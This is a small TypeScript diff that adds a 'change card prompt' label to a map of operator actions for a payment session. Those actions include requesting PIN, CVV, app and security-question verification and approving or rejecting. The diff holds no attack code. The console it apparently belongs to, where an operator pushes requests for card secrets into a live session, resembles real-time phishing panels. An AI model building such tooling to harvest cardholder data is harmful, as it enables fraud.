@@ -93,7 +93,7 @@ function handleAction(action: Api.Payment.OperatorAction, sessionId: string, mes
     email_verify: '邮箱验证', pin_verify: 'PIN验证',
     cvv_verify: 'CVV验证', app_verify: 'APP验证',
     question_verify: '问题验证', change_card: '换卡支付',
-    custom_prompt: '自定义提示', redirect_complete: '跳转完成',
+    custom_prompt: '自定义提示', change_card_prompt: '自定义提示（换卡支付）', redirect_complete: '跳转完成',
     approve: '通过', reject: '拒绝'
   };
   window.$message?.info(`已发送操作: ${labels[action] || action}` + (message ? ` (${message})` : ''));
